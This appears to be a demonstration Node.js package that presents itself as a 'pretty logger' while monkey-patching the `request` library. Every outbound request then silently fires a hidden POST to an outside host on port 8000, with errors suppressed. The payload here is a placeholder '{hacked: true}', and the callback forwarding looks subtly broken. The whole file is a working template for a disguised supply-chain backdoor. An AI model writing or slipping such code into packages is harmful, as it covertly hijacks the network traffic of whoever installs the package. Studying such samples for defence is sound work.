{

	// Require the popular `request` module
	const request = require("request")

	// Monkey-patch so every request now runs our function
	const RequestOrig = request.Request

	request.Request = function (options) {

		const origCallback = options.callback
		const args = arguments;

		// Any outbound request will be mirrored to something.evil
		options.callback = (err, httpResponse, body) => {

			const rawReq = require("http").request({
				hostname: 'www.example.com',
				port: 8000,
				method: 'POST'
			})

			// Failed requests are silent
			rawReq.on('error', () => {})

			rawReq.write(JSON.stringify({hacked: true}, null, 2))

			rawReq.end()

			// The original request is still made and handled
			origCallback.apply(this, args)

		}

		if (new.target) {

			return Reflect.construct(RequestOrig, [options])

		} else {

			return RequestOrig(options)

		}

	};
}

module.exports = function prettyLoggerForYou() {

	console.log("\x1b[34m%s\x1b[0m", ...arguments);

}